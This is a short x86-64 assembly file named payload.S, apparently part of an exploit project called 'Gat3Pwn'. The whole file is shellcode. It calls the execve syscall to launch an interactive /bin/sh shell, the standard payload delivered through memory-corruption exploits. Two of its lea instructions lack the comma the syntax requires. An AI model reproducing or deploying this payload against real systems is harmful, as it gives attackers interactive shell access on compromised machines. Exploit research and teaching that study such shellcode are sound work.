;
;  payload.S
;  Gat3Pwn
;
;  Created by The Gate Group on 2020.
;  Copyright © 2020 The Gate Group. All rights reserved.
;

section .text
global _start
_start:
	 mov rax, 59        ; call execve
	 lea rdi [rel cmd]  ; command
	 lea rsi [rel args] ; command args
	 xor edx, edx       ; zero initialize edx
	 syscall            ; call execve

section .rodata
align 8
args dq cmd, arg1, 0
arg1 db '-i', 0
cmd  db '/bin/sh', 0
